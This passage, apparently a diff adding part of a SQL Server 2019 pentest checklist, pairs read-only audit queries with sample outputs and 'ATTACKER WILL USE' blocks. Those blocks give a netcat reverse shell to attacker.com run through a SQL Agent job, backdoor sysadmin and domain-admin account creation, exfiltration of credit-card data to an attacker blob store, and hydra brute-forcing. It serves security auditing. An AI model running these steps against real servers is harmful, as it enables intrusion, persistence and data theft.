+@job_id = (SELECT job_id FROM msdb.dbo.sysjobs WHERE name = 'Backup_Job'),
+@step_id = 1,
+@command = 'nc -e cmd.exe attacker.com 4444';
+
+-- Execute the job
+EXEC msdb.dbo.sp_start_job @job_name = 'Backup_Job';
+
+================================================================
+COMMAND 23: SQL AGENT PROXIES - PRIVILEGE ESCALATION
+================================================================
+
+STEP 23.1: Check SQL Agent proxies
+SELECT 
+    p.name AS proxy_name,
+    p.enabled,
+    c.name AS credential_name,
+    c.credential_identity,
+    CASE 
+        WHEN c.credential_identity LIKE '%Administrator%' OR 
+             c.credential_identity LIKE '%admin%' OR
+             c.credential_identity LIKE '%sa%'
+        THEN '✅ HIGH PRIVILEGE PROXY'
+        ELSE 'Proxy with credentials'
+    END AS proxy_privilege
+FROM msdb.dbo.sysproxies p
+LEFT JOIN sys.credentials c ON p.credential_id = c.credential_id
+WHERE p.enabled = 1;
+
+SAFE OUTPUT:
+proxy_name | enabled | credential_name | credential_identity | proxy_privilege
+-----------|---------|-----------------|---------------------|----------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+proxy_name  | enabled | credential_name | credential_identity | proxy_privilege
+------------|---------|-----------------|---------------------|----------------
+Admin_Proxy | 1       | AdminCred       | DOMAIN\Administrator| ✅ HIGH PRIVILEGE PROXY
+
+================================================================
+
+STEP 23.2: Check who can use proxies
+SELECT 
+    p.name AS proxy_name,
+    pp.name AS principal_name,
+    pp.type_desc,
+    pp.is_disabled,
+    CASE 
+        WHEN pp.is_disabled = 0 
+        THEN '✅ Can use proxy: ' + p.name
+        ELSE '❌ Cannot use proxy (disabled)'
+    END AS proxy_access
+FROM msdb.dbo.sysproxies p
+JOIN msdb.dbo.sysproxylogin pl ON p.proxy_id = pl.proxy_id
+JOIN sys.server_principals pp ON pl.principal_id = pp.principal_id
+WHERE p.enabled = 1
+ORDER BY p.name, pp.name;
+
+SAFE OUTPUT:
+proxy_name | principal_name | type_desc | is_disabled | proxy_access
+-----------|----------------|-----------|-------------|--------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+proxy_name  | principal_name | type_desc | is_disabled | proxy_access
+------------|----------------|-----------|-------------|--------------
+Admin_Proxy | app_user       | SQL_LOGIN | 0          | ✅ Can use proxy: Admin_Proxy
+
+================================================================
+
+STEP 23.3: Check current user's proxy access
+SELECT 
+    SUSER_SNAME() AS current_user,
+    p.name AS proxy_name,
+    c.credential_identity,
+    CASE 
+        WHEN EXISTS (SELECT 1 FROM msdb.dbo.sysproxylogin pl 
+                     WHERE pl.proxy_id = p.proxy_id 
+                     AND pl.principal_id = USER_ID(SUSER_SNAME()))
+        THEN '✅ Can use proxy: ' + p.name + ' (' + c.credential_identity + ')'
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 
+        THEN '✅ Can use all proxies (sysadmin)'
+        ELSE '❌ Cannot use proxy: ' + p.name
+    END AS proxy_access_status
+FROM msdb.dbo.sysproxies p
+LEFT JOIN sys.credentials c ON p.credential_id = c.credential_id
+WHERE p.enabled = 1;
+
+SAFE OUTPUT:
+current_user | proxy_name | credential_identity | proxy_access_status
+-------------|------------|---------------------|-------------------
+app_user     | Admin_Proxy| DOMAIN\Administrator| ❌ Cannot use proxy: Admin_Proxy
+
+VULNERABLE OUTPUT:
+current_user | proxy_name | credential_identity | proxy_access_status
+-------------|------------|---------------------|-------------------
+app_user     | Admin_Proxy| DOMAIN\Administrator| ✅ Can use proxy: Admin_Proxy (DOMAIN\Administrator)
+
+================================================================
+ATTACKER WILL USE:
+-- Create job with Admin_Proxy
+EXEC msdb.dbo.sp_add_job @job_name = 'Elevated_Job';
+EXEC msdb.dbo.sp_add_jobstep @job_name = 'Elevated_Job',
+  @step_name = 'Elevated_Cmd',
+  @subsystem = 'CmdExec',
+  @command = 'whoami > C:\temp\privilege.txt',
+  @proxy_name = 'Admin_Proxy';
+
+-- Execute the job
+EXEC msdb.dbo.sp_start_job @job_name = 'Elevated_Job';
+
+================================================================
+COMMAND 24: LINKED SERVERS - LATERAL MOVEMENT
+================================================================
+
+STEP 24.1: Check linked servers
+EXEC sp_linkedservers;
+
+SELECT 
+    s.name AS linked_server,
+    s.is_rpc_out_enabled,
+    s.is_data_access_enabled,
+    s.is_remote_login_enabled,
+    s.is_rpc_enabled,
+    CASE 
+        WHEN s.is_rpc_out_enabled = 1 OR s.is_data_access_enabled = 1 
+        THEN '✅ Can execute commands on remote server'
+        ELSE '⚠️ Check permissions'
+    END AS lateral_movement_possible
+FROM sys.servers s
+WHERE s.is_linked = 1;
+
+SAFE OUTPUT:
+linked_server | is_rpc_out_enabled | is_data_access_enabled | lateral_movement_possible
+--------------|-------------------|------------------------|---------------------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+linked_server | is_rpc_out_enabled | is_data_access_enabled | lateral_movement_possible
+--------------|-------------------|------------------------|---------------------------
+PROD_SERVER   | 1                 | 1                      | ✅ Can execute commands on remote server
+
+================================================================
+
+STEP 24.2: Check who can use linked servers
+SELECT 
+    p.name AS grantee,
+    p.type_desc,
+    sp.permission_name,
+    sp.state_desc,
+    CASE 
+        WHEN sp.permission_name = 'CONNECT' AND sp.state_desc = 'GRANT' 
+        THEN '✅ Can connect to linked server'
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 
+        THEN '✅ Can connect to linked server (sysadmin)'
+        ELSE '❌ Cannot connect to linked server'
+    END AS can_connect
+FROM sys.server_principals p
+LEFT JOIN sys.server_permissions sp 
+    ON p.principal_id = sp.grantee_principal_id
+    AND sp.permission_name = 'CONNECT'
+    AND sp.major_id IN (SELECT server_id FROM sys.servers WHERE is_linked = 1)
+WHERE p.type IN ('S', 'U', 'G')
+AND p.name NOT LIKE '##%'
+ORDER BY p.name;
+
+SAFE OUTPUT:
+grantee | type_desc | permission_name | state_desc | can_connect
+--------|-----------|-----------------|------------|------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+grantee | type_desc | permission_name | state_desc | can_connect
+--------|-----------|-----------------|------------|------------
+app_user| SQL_LOGIN | CONNECT         | GRANT      | ✅ Can connect to linked server
+
+================================================================
+
+STEP 24.3: Check current user's linked server access
+SELECT 
+    SUSER_SNAME() AS current_user,
+    s.name AS linked_server,
+    CASE 
+        WHEN EXISTS (SELECT 1 FROM sys.server_permissions sp 
+                     WHERE sp.grantee_principal_id = USER_ID(SUSER_SNAME())
+                     AND sp.permission_name = 'CONNECT'
+                     AND sp.major_id = s.server_id)
+        THEN '✅ Can connect to ' + s.name
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 
+        THEN '✅ Can connect to ' + s.name + ' (sysadmin)'
+        ELSE '❌ Cannot connect to ' + s.name
+    END AS connection_status
+FROM sys.servers s
+WHERE s.is_linked = 1;
+
+SAFE OUTPUT:
+current_user | linked_server | connection_status
+-------------|---------------|------------------
+app_user     | PROD_SERVER   | ❌ Cannot connect to PROD_SERVER
+
+VULNERABLE OUTPUT:
+current_user | linked_server | connection_status
+-------------|---------------|------------------
+app_user     | PROD_SERVER   | ✅ Can connect to PROD_SERVER
+
+================================================================
+ATTACKER WILL USE:
+EXEC ('EXEC xp_cmdshell ''whoami''') AT PROD_SERVER;
+EXEC ('SELECT * FROM sys.dm_exec_sessions') AT PROD_SERVER;
+SELECT * INTO #remote_data
+FROM OPENQUERY(PROD_SERVER, 'SELECT * FROM CreditCards');
+
+================================================================
+COMMAND 25: EXTERNAL DATA SOURCES - DATA EXFILTRATION
+================================================================
+
+STEP 25.1: Check external data sources
+SELECT 
+    name,
+    type_desc,
+    location,
+    connection_options,
+    CASE 
+        WHEN location LIKE '%attacker%' OR location LIKE '%unknown%' 
+        THEN '✅ Suspicious external source'
+        ELSE 'External source - Check'
+    END AS external_source_status
+FROM sys.external_data_sources;
+
+SAFE OUTPUT:
+name | type_desc | location | connection_options | external_source_status
+-----|-----------|----------|-------------------|-----------------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+name                | type_desc | location                      | external_source_status
+--------------------|-----------|-------------------------------|-----------------------
+AzureBlobSource     | BLOB      | https://storage.blob.core...  | External source - Check
+SuspiciousSource    | HADOOP    | https://attacker.azure.com... | ✅ Suspicious external source
+
+================================================================
+
+STEP 25.2: Check who can create external tables
+SELECT 
+    p.name AS grantee,
+    p.type_desc,
+    pp.permission_name,
+    pp.state_desc,
+    CASE 
+        WHEN pp.permission_name = 'CREATE EXTERNAL TABLE' 
+        AND pp.state_desc = 'GRANT'
+        THEN '✅ Can create external tables'
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 
+        THEN '✅ Can create external tables (sysadmin)'
+        ELSE '❌ Cannot create external tables'
+    END AS external_table_access
+FROM sys.database_principals p
+LEFT JOIN sys.database_permissions pp 
+    ON p.principal_id = pp.grantee_principal_id
+    AND pp.permission_name = 'CREATE EXTERNAL TABLE'
+WHERE p.type IN ('S', 'U', 'G')
+AND p.principal_id > 4
+ORDER BY p.name;
+
+SAFE OUTPUT:
+grantee | type_desc | permission_name | state_desc | external_table_access
+--------|-----------|-----------------|------------|----------------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+grantee | type_desc | permission_name | state_desc | external_table_access
+--------|-----------|-----------------|------------|----------------------
+app_user| SQL_USER  | CREATE EXTERNAL TABLE | GRANT | ✅ Can create external tables
+
+================================================================
+ATTACKER WILL USE:
+CREATE EXTERNAL TABLE DataExfil 
+WITH (
+  LOCATION = 'https://attacker.blob.core.windows.net/steal/',
+  DATA_SOURCE = AzureBlobSource
+) 
+AS SELECT * FROM CreditCards;
+
+================================================================
+COMMAND 26: UNENCRYPTED CONNECTIONS - CREDENTIAL SNIFFING
+================================================================
+
+STEP 26.1: Check unencrypted connections
+SELECT 
+    c.session_id,
+    s.login_name,
+    s.host_name,
+    s.program_name,
+    c.client_net_address,
+    c.net_transport,
+    c.auth_scheme,
+    c.encrypt_option,
+    CASE 
+        WHEN c.encrypt_option = 0 AND c.net_transport = 'TCP' 
+             AND c.client_net_address != '127.0.0.1'
+        THEN '✅ UNENCRYPTED - Credentials at risk'
+        WHEN c.encrypt_option = 0 AND c.net_transport != 'TCP'
+        THEN 'Non-TCP connection - Check'
+        ELSE 'Encrypted connection'
+    END AS encryption_status
+FROM sys.dm_exec_connections c
+JOIN sys.dm_exec_sessions s ON c.session_id = s.session_id
+WHERE c.net_transport = 'TCP'
+ORDER BY c.session_id;
+
+SAFE OUTPUT:
+session_id | login_name | host_name | encrypt_option | encryption_status
+-----------|------------|-----------|----------------|-------------------
+(0 rows affected) or all encrypt_option = TRUE
+
+VULNERABLE OUTPUT:
+session_id | login_name | host_name    | encrypt_option | encryption_status
+-----------|------------|--------------|----------------|-------------------
+51         | app_user   | APP-SERVER   | 0              | ✅ UNENCRYPTED - Credentials at risk
+52         | sa         | ADMIN-PC     | 0              | ✅ UNENCRYPTED - Credentials at risk
+
+================================================================
+
+STEP 26.2: Check who can sniff network traffic
+SELECT 
+    'Anyone on same network' AS attacker,
+    COUNT(*) AS unencrypted_sessions,
+    CASE 
+        WHEN COUNT(*) > 0 
+        THEN '✅ Can sniff credentials from ' + CAST(COUNT(*) AS VARCHAR) + ' sessions'
+        ELSE '❌ No unencrypted sessions to sniff'
+    END AS sniffing_opportunity
+FROM sys.dm_exec_connections c
+WHERE c.encrypt_option = 0 
+  AND c.net_transport = 'TCP'
+  AND c.client_net_address != '127.0.0.1';
+
+VULNERABLE OUTPUT:
+attacker               | unencrypted_sessions | sniffing_opportunity
+-----------------------|---------------------|----------------------
+Anyone on same network | 3                   | ✅ Can sniff credentials from 3 sessions
+
+================================================================
+ATTACKER WILL USE:
+-- On same network, use Wireshark to capture packets
+-- Filter for TDS protocol (port 1433)
+-- Extract login credentials from packets
+-- Usernames and passwords visible in plaintext
+-- All SQL queries and results visible
+
+Example captured packet contents:
+LOGIN: app_user
+PASSWORD: Password123!
+QUERY: SELECT * FROM CreditCards
+RESULT: All credit card numbers visible
+
+================================================================
+COMMAND 27: TCP ENDPOINTS - ATTACK SURFACE
+================================================================
+
+STEP 27.1: Check TCP endpoints
+SELECT 
+    name,
+    state_desc,
+    type_desc,
+    protocol_desc,
+    port,
+    is_admin_endpoint,
+    CASE 
+        WHEN port NOT IN (1433, 1434, 5022) AND state_desc = 'STARTED'
+        THEN '✅ NON-STANDARD PORT - Attack surface increased'
+        WHEN is_admin_endpoint = 1 AND state_desc = 'STARTED'
+        THEN '✅ ADMIN ENDPOINT - High risk'
+        ELSE 'Standard endpoint'
+    END AS endpoint_status
+FROM sys.tcp_endpoints
+WHERE state_desc = 'STARTED';
+
+SAFE OUTPUT:
+name             | state_desc | type_desc | protocol_desc | port | is_admin_endpoint | endpoint_status
+-----------------|------------|-----------|---------------|------|-------------------|----------------
+TSQL Default TCP | STARTED    | TSQL      | TCP           | 1433 | 0                 | Standard endpoint
+
+VULNERABLE OUTPUT:
+name             | state_desc | type_desc | protocol_desc | port | is_admin_endpoint | endpoint_status
+-----------------|------------|-----------|---------------|------|-------------------|----------------
+TSQL Default TCP | STARTED    | TSQL      | TCP           | 1433 | 0                 | Standard endpoint
+Admin Endpoint   | STARTED    | TSQL      | TCP           | 1434 | 1                 | ✅ ADMIN ENDPOINT - High risk
+Custom Endpoint  | STARTED    | TSQL      | TCP           | 8080 | 0                 | ✅ NON-STANDARD PORT
+
+================================================================
+ATTACKER WILL USE:
+-- Scan for non-standard ports
+nmap -p 1433,1434,8080 target_server
+
+-- Connect to admin endpoint
+sqlcmd -S target_server,1434 -U sa -P password -A
+
+================================================================
+COMMAND 28: SERVICE ACCOUNT - PRIVILEGE ESCALATION
+================================================================
+
+STEP 28.1: Check service account
+SELECT 
+    servicename,
+    startup_type_desc,
+    status_desc,
+    startup_account,
+    last_startup_time,
+    filename,
+    CASE 
+        WHEN startup_account LIKE '%Administrator%' OR 
+             startup_account LIKE '%admin%' OR
+             startup_account LIKE '%sa%'
+        THEN '✅ HIGH PRIVILEGE SERVICE ACCOUNT'
+        WHEN startup_account LIKE '%LOCAL%' OR startup_account LIKE '%NETWORK%'
+        THEN '✅ SYSTEM LEVEL SERVICE ACCOUNT'
+        ELSE 'Service account'
+    END AS service_account_status
+FROM sys.dm_server_services;
+
+SAFE OUTPUT:
+servicename          | startup_account   | service_account_status
+---------------------|-------------------|------------------------
+SQL Server (MSSQLSERVER)| DOMAIN\svc_sql  | Service account
+
+VULNERABLE OUTPUT:
+servicename          | startup_account   | service_account_status
+---------------------|-------------------|------------------------
+SQL Server (MSSQLSERVER)| DOMAIN\Administrator | ✅ HIGH PRIVILEGE SERVICE ACCOUNT
+SQL Server Agent     | DOMAIN\Administrator | ✅ HIGH PRIVILEGE SERVICE ACCOUNT
+
+================================================================
+ATTACKER WILL USE:
+-- If service account is high privilege
+EXEC xp_cmdshell 'whoami'; -- Returns DOMAIN\Administrator
+EXEC xp_cmdshell 'net user hacker P@ssw0rd /add /domain';
+EXEC xp_cmdshell 'net group "Domain Admins" hacker /add /domain';
+
+================================================================
+COMMAND 29: AUDITING - DETECTION BYPASS
+================================================================
+
+STEP 29.1: Check auditing status
+SELECT 
+    name,
+    status_desc,
+    create_date,
+    modify_date,
+    CASE 
+        WHEN status_desc != 'STARTED' 
+        THEN '✅ AUDIT DISABLED - Detection bypass possible'
+        ELSE 'Audit enabled'
+    END AS audit_status
+FROM sys.server_audits;
+
+SAFE OUTPUT:
+name           | status_desc | create_date | audit_status
+---------------|-------------|-------------|-------------
+SQLServerAudit | STARTED     | 2024-01-01  | Audit enabled
+
+VULNERABLE OUTPUT:
+name           | status_desc | create_date | audit_status
+---------------|-------------|-------------|-------------
+SQLServerAudit | NOT_STARTED | 2024-01-01  | ✅ AUDIT DISABLED - Detection bypass possible
+
+================================================================
+
+STEP 29.2: Check login auditing
+SELECT 
+    name,
+    value_in_use,
+    CASE 
+        WHEN name LIKE '%login%' AND value_in_use IN (0, 1)
+        THEN '✅ LOGIN AUDITING WEAK - Brute force undetected'
+        WHEN name LIKE '%login%' AND value_in_use = 2
+        THEN 'Login auditing enabled'
+        ELSE 'Check'
+    END AS login_audit_status
+FROM sys.configurations
+WHERE name LIKE '%login%' OR name LIKE '%audit%';
+
+SAFE OUTPUT:
+name             | value_in_use | login_audit_status
+-----------------|--------------|-------------------
+default trace enabled | 1       | Login auditing enabled
+login audit level | 2           | Login auditing enabled
+
+VULNERABLE OUTPUT:
+name             | value_in_use | login_audit_status
+-----------------|--------------|-------------------
+default trace enabled | 0       | ✅ LOGIN AUDITING WEAK
+login audit level | 0           | ✅ LOGIN AUDITING WEAK
+
+================================================================
+ATTACKER WILL USE:
+-- Brute force without detection (auditing disabled)
+-- Use hydra/medusa for thousands of attempts
+hydra -l sa -P wordlist.txt mssql://target
+
+-- No logs will be generated
+-- No SIEM alerts
+-- No audit trail
+
+================================================================
+COMMAND 30: DATABASE ENCRYPTION - DATA AT REST
+================================================================
+
+STEP 30.1: Check database encryption
+SELECT 
+    DB_NAME(database_id) AS database_name,
+    encryption_state,
+    percent_complete,
+    key_algorithm,
+    key_length,
+    CASE 
+        WHEN encryption_state = 1 
+        THEN '✅ DATABASE UNENCRYPTED - Data at risk'
+        WHEN encryption_state = 3 
+        THEN 'Encrypted'
+        ELSE 'Check encryption state'
+    END AS encryption_status
+FROM sys.dm_database_encryption_keys
+ORDER BY database_id;
+
+SAFE OUTPUT:
+database_name | encryption_state | key_algorithm | key_length | encryption_status
+--------------|------------------|---------------|------------|-------------------
+ProductionDB  | 3                | AES_256       | 256        | Encrypted
+SalesDB       | 3                | AES_256       | 256        | Encrypted
+
+VULNERABLE OUTPUT:
+database_name | encryption_state | key_algorithm | key_length | encryption_status
+--------------|------------------|---------------|------------|-------------------
+ProductionDB  | 3                | AES_256       | 256        | Encrypted
+SalesDB       | 1                | NULL          | NULL       | ✅ DATABASE UNENCRYPTED - Data at risk
+CustomersDB   | 1                | NULL          | NULL       | ✅ DATABASE UNENCRYPTED - Data at risk
+
+================================================================
+
+STEP 30.2: Check who can access unencrypted data
+SELECT 
+    SUSER_SNAME() AS current_user,
+    CASE 
+        WHEN EXISTS (SELECT 1 FROM sys.databases d 
+                     WHERE d.name = DB_NAME()
+                     AND d.is_encrypted = 0
+                     AND HAS_PERMS_BY_NAME(d.name, 'DATABASE', 'SELECT') = 1)
+        THEN '✅ Can read unencrypted data'
+        ELSE '❌ Cannot access'
+    END AS unencrypted_access;
+
+VULNERABLE OUTPUT:
+current_user | unencrypted_access
+-------------|-------------------
+app_user     | ✅ Can read unencrypted data
+
+================================================================
+ATTACKER WILL USE:
+-- If database is unencrypted
+SELECT * FROM CreditCards; -- Data is plaintext
+SELECT * FROM Users;
+SELECT * FROM EmployeeSalaries;
+
+-- All data is readable without any decryption
+-- Physical access to database files = full data breach
+
+================================================================
+COMMAND 31: SENSITIVE COLUMNS - DATA EXPOSURE
+================================================================
+
+STEP 31.1: Check sensitive columns
+SELECT 
+    SCHEMA_NAME(t.schema_id) AS schema_name,
+    t.name AS table_name,
+    c.name AS column_name,
+    ty.name AS data_type,
+    CASE 
+        WHEN ty.name IN ('varchar', 'nvarchar', 'text', 'ntext') 
+        THEN '✅ PLAINTEXT SENSITIVE DATA'
+        WHEN ty.name IN ('varbinary', 'binary') 
+        THEN '⚠️ Potentially encrypted - Check'
+        ELSE 'Check data type'
+    END AS sensitive_status
+FROM sys.tables t
+JOIN sys.columns c ON t.object_id = c.object_id
+JOIN sys.types ty ON c.user_type_id = ty.user_type_id
+WHERE c.name LIKE '%password%' OR c.name LIKE '%pass%'
+   OR c.name LIKE '%secret%' OR c.name LIKE '%token%'
+   OR c.name LIKE '%key%' OR c.name LIKE '%apikey%'
+   OR c.name LIKE '%ssn%' OR c.name LIKE '%social%'
+   OR c.name LIKE '%card%' OR c.name LIKE '%credit%'
+   OR c.name LIKE '%account%' OR c.name LIKE '%bank%'
+   OR c.name LIKE '%auth%' OR c.name LIKE '%credential%'
+   OR c.name LIKE '%salary%' OR c.name LIKE '%sin%'
+ORDER BY schema_name, table_name, column_name;
+
+SAFE OUTPUT:
+schema_name | table_name | column_name | data_type | sensitive_status
+------------|------------|-------------|-----------|------------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+schema_name | table_name     | column_name      | data_type | sensitive_status
+------------|----------------|------------------|-----------|------------------
+dbo         | Users          | password         | nvarchar  | ✅ PLAINTEXT SENSITIVE DATA
+dbo         | Users          | auth_token       | nvarchar  | ✅ PLAINTEXT SENSITIVE DATA
+dbo         | Customers      | credit_card      | nvarchar  | ✅ PLAINTEXT SENSITIVE DATA
+dbo         | Customers      | ssn              | nvarchar  | ✅ PLAINTEXT SENSITIVE DATA
+dbo         | API_Keys       | api_key          | nvarchar  | ✅ PLAINTEXT SENSITIVE DATA
+
+================================================================
+
+STEP 31.2: Check who can access sensitive columns
+SELECT 
+    SUSER_SNAME() AS current_user,
+    COUNT(*) AS sensitive_tables_accessible,
+    CASE 
+        WHEN COUNT(*) > 0 
+        THEN '✅ Can access ' + CAST(COUNT(*) AS VARCHAR) + ' sensitive tables'
+        ELSE '❌ Cannot access sensitive data'
+    END AS sensitive_access
+FROM sys.tables t
+JOIN sys.columns c ON t.object_id = c.object_id
+WHERE c.name LIKE '%password%' OR c.name LIKE '%pass%'
+   OR c.name LIKE '%secret%' OR c.name LIKE '%token%'
+   OR c.name LIKE '%key%' OR c.name LIKE '%apikey%'
+   OR c.name LIKE '%ssn%' OR c.name LIKE '%social%'
+   OR c.name LIKE '%card%' OR c.name LIKE '%credit%'
+   OR c.name LIKE '%account%' OR c.name LIKE '%bank%'
+   AND HAS_PERMS_BY_NAME(t.name, 'OBJECT', 'SELECT') = 1;
+
+VULNERABLE OUTPUT:
+current_user | sensitive_tables_accessible | sensitive_access
+-------------|-----------------------------|------------------
+app_user     | 5                           | ✅ Can access 5 sensitive tables
+
+================================================================
+ATTACKER WILL USE:
+SELECT username, password FROM Users;
+SELECT name, credit_card, ssn FROM Customers;
+SELECT app_name, api_key FROM API_Keys;
+SELECT employee_name, salary FROM Employees;
+
+================================================================
+COMMAND 32: FINAL ATTACKER SUMMARY - KAUN KYA KAR SAKTA HAI?
+================================================================
+
+STEP 32.1: Complete attacker summary
+SELECT 
+    SUSER_SNAME() AS current_user,
+    IS_SRVROLEMEMBER('sysadmin') AS is_sysadmin,
+    HAS_PERMS_BY_NAME('xp_cmdshell', 'OBJECT', 'EXECUTE') AS can_xp_cmdshell,
+    HAS_PERMS_BY_NAME('', 'SERVER', 'CREATE ASSEMBLY') AS can_clr,
+    HAS_PERMS_BY_NAME('sp_OACreate', 'OBJECT', 'EXECUTE') AS can_ole,
+    HAS_PERMS_BY_NAME('sa', 'LOGIN', 'IMPERSONATE') AS can_impersonate_sa,
+    (SELECT COUNT(*) FROM sys.databases WHERE is_trustworthy_on = 1 
+     AND HAS_PERMS_BY_NAME(name, 'DATABASE', 'CONTROL') = 1) AS can_exploit_trustworthy,
+    (SELECT COUNT(*) FROM sys.servers WHERE is_linked = 1 
+     AND HAS_PERMS_BY_NAME(name, 'SERVER', 'CONNECT') = 1) AS can_use_linked_servers,
+    (SELECT COUNT(*) FROM sys.credentials) AS stored_credentials,
+    CASE 
+        WHEN IS_SRVROLEMEMBER('sysadmin') = 1 THEN '✅ FULL SYSTEM ACCESS - CRITICAL'
+        WHEN HAS_PERMS_BY_NAME('xp_cmdshell', 'OBJECT', 'EXECUTE') = 1 THEN '✅ Can execute OS commands - CRITICAL'
+        WHEN HAS_PERMS_BY_NAME('sa', 'LOGIN', 'IMPERSONATE') = 1 THEN '✅ Can become sysadmin - CRITICAL'
+        WHEN (SELECT COUNT(*) FROM sys.databases WHERE is_trustworthy_on = 1 
+              AND HAS_PERMS_BY_NAME(name, 'DATABASE', 'CONTROL') = 1) > 0 
+        THEN '✅ Can exploit TRUSTWORTHY - HIGH'
+        WHEN HAS_PERMS_BY_NAME('', 'SERVER', 'CREATE ASSEMBLY') = 1 THEN '✅ Can execute CLR code - HIGH'
+        WHEN HAS_PERMS_BY_NAME('sp_OACreate', 'OBJECT', 'EXECUTE') = 1 THEN '✅ Can use OLE Automation - HIGH'
+        ELSE '⚠️ Limited access - Check specific permissions'
+    END AS overall_risk;
+
+SAFE OUTPUT:
+current_user | is_sysadmin | can_xp_cmdshell | can_clr | can_ole | can_impersonate_sa | can_exploit_trustworthy | can_use_linked_servers | stored_credentials | overall_risk
+-------------|-------------|-----------------|---------|---------|-------------------|------------------------|----------------------|---------------------|-------------
+app_user     | 0           | 0               | 0       | 0       | 0                 | 0                      | 0                    | 0                   | ⚠️ Limited access - Check specific permissions
+
+VULNERABLE OUTPUT:
+current_user | is_sysadmin | can_xp_cmdshell | can_clr | can_ole | can_impersonate_sa | can_exploit_trustworthy | can_use_linked_servers | stored_credentials | overall_risk
+-------------|-------------|-----------------|---------|---------|-------------------|------------------------|----------------------|---------------------|-------------
+app_user     | 0           | 1               | 1       | 1       | 1                 | 2                      | 2                    | 5                   | ✅ Can execute OS commands - CRITICAL
+
+================================================================
+ATTACKER WILL USE (if multiple vulnerabilities):
+1. First, impersonate sa:
+   EXECUTE AS LOGIN = 'sa';
+
+2. Now with sysadmin access, execute OS commands:
+   EXEC xp_cmdshell 'whoami';
+
+3. Create new backdoor user:
+   CREATE LOGIN backdoor WITH PASSWORD = 'hacked!';
+   ALTER SERVER ROLE sysadmin ADD MEMBER backdoor;
+
+4. Exfiltrate data:
+   SELECT * INTO #temp FROM OPENROWSET(...);
+
+5. Maintain persistence through job:
+   EXEC msdb.dbo.sp_add_job @job_name = 'Backdoor_Job';
+   EXEC msdb.dbo.sp_add_jobstep @job_name = 'Backdoor_Job',
+     @step_name = 'Reverse_Shell',
+     @subsystem = 'CmdExec',
+     @command = 'nc -e cmd.exe attacker.com 4444';
+
+================================================================
+COMPLETE SUMMARY TABLE - HAR COMMAND MEIN KAUN KYA KAR SAKTA HAI
+================================================================
+
+| # | Vulnerability | Who Can Exploit | Check Commands | Risk |
+|---|---------------|-----------------|----------------|------|
+| 1 | xp_cmdshell | sysadmin members OR users with EXECUTE permission | 1.1, 1.2, 1.3, 1.4 | CRITICAL |
+| 2 | CLR | sysadmin OR users with CREATE ASSEMBLY permission | 2.1, 2.2, 2.3 | HIGH |
+| 3 | OLE Automation | sysadmin OR users with EXECUTE on OLE procs | 3.1, 3.2, 3.3 | HIGH |
+| 4 | Ad Hoc Queries | sysadmin OR users with CONNECT permission | 4.1, 4.2, 4.3 | HIGH |
+| 5 | Database Mail | sysadmin OR users with EXECUTE on sp_send_dbmail | 5.1, 5.2 | MEDIUM |
+| 6 | Remote Admin | sysadmin only (DAC) | 6.1, 6.2 | HIGH |
+| 7 | Remote Access | Users with CONNECT SQL permission | 7.1, 7.2 | MEDIUM |
+| 8 | Cross DB Chaining | db_owner OR sysadmin | 8.1, 8.2 | HIGH |
+| 9 | Contained Databases | Contained users (no server login needed) | 9.1, 9.2, 9.3 | MEDIUM |
+| 10 | Stored Credentials | Users with proxy access | 10.1, 10.2 | HIGH |
+| 11 | DB Scoped Credentials | Users with REFERENCES permission | 11.1, 11.2 | HIGH |
+| 12 | Impersonation | Users with IMPERSONATE permission | 12.1, 12.2, 12.3 | CRITICAL |
+| 13 | TRUSTWORTHY | db_owner OR users with CONTROL/ALTER | 13.1, 13.2, 13.3 | HIGH |
+| 14 | Server Roles | Members of high-privilege server roles | 14.1, 14.2 | CRITICAL |
+| 15 | Server Permissions | Users with high-risk permissions | 15.1, 15.2 | CRITICAL |
+| 16 | Database Roles | Members of db_owner, db_securityadmin, db_ddladmin | 16.1, 16.2 | HIGH |
+| 17 | DB Permissions | Users with CONTROL, ALTER, IMPERSONATE | 17.1, 17.2 | HIGH |
+| 18 | PUBLIC Role | ALL users (including anonymous) | 18.1, 18.2 | HIGH |
+| 19 | Guest User | ANYONE without authentication | 19.1, 19.2 | MEDIUM |
+| 20 | Orphaned Users | sysadmin OR users with CREATE LOGIN | 20.1, 20.2 | MEDIUM |
+| 21 | SA Account | Anyone with network access (brute force) | 21.1, 21.2 | CRITICAL |
+| 22 | SQL Agent Jobs | sysadmin OR users with ALTER/EXECUTE | 22.1, 22.2, 22.3 | HIGH |
+| 23 | SQL Agent Proxies | Users with proxy access (sysproxylogin) | 23.1, 23.2, 23.3 | HIGH |
+| 24 | Linked Servers | Users with CONNECT permission | 24.1, 24.2, 24.3 | HIGH |
+| 25 | External Sources | sysadmin OR users with CREATE EXTERNAL TABLE | 25.1, 25.2 | HIGH |
+| 26 | Unencrypted Traffic | Anyone on same network (sniffing) | 26.1, 26.2 | HIGH |
+| 27 | TCP Endpoints | Anyone with network access | 27.1 | MEDIUM |
+| 28 | Service Account | Anyone who can exploit service account | 28.1 | CRITICAL |
+| 29 | Auditing | Anyone (auditing disabled = undetected attacks) | 29.1, 29.2 | MEDIUM |
+| 30 | DB Encryption | Anyone with SELECT on unencrypted DBs | 30.1, 30.2 | HIGH |
+| 31 | Sensitive Columns | Anyone with SELECT on sensitive columns | 31.1, 31.2 | HIGH |
+| 32 | Final Summary | Current user's complete attack surface | 32.1 | VARIES |
+
+================================================================
+CRITICAL REMINDERS - BHAI YE YAAD RAKH
+================================================================
+
+1. Enabled != Vulnerable - Check if feature is actually required
+2. Disabled != Secure - Check if feature should be disabled
+3. SAFE != Good - Safe output matlab vulnerability nahi, security posture check karo
+4. VULNERABLE != Exploitable - Check permissions and business justification
+5. Read-Only Commands - Koi bhi modifying command MAT KARNA
+6. Validate Findings - Har finding ko real-world scenario mein validate karo
+7. Report with Context - Enabled feature ka business requirement check karo
+8. No Secret Extraction - Passwords/hashes/private keys MAT NIKALNA
+
+================================================================
+END OF COMPLETE SQL SERVER 2019 PENTEST FRAMEWORK
+================================================================
